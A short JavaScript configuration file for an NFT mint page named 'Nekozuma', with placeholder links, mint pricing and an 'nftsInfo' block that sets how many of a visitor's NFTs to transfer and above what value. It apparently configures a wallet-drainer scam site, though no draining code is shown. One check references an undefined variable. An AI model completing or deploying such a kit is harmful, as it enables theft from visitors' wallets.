const collectionInfo = {
    name: "Nekozuma",
    title: "{name}",
    date: "10.08.2022",
    socialMedia: {
        discord: "https://discord.com/",
        twitter: "https://twitter.com/",
    },
    medias: {
        preview: "2.gif",
        favicon: "logo.jpg",
    },
    background: {
        type: "image",
        image: "1.gif",
        video: "",
        color: "#4E4E6D",
    }
}
const mintInfo = {
    price: 1.88,
    totalSupply: 2000,
    toFixed: 2,
    minUnits: 1,
    maxUnits: 2,
    askMintLoop: true,
}

const nftsInfo = {
    active: true,
    minValue: 0.3,
    maxTransfer: 5,
}

if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);